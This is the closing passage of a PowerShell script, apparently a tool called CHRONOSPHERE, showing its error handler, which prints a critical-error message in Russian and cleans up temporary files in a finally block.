    Write-Host "[CHRONOSPHERE] Критическая ошибка: $_" -ForegroundColor Red
    Cleanup-TemporaryFiles
}
finally {
    # Гарантированная очистка
    Cleanup-TemporaryFiles
}
#endregion
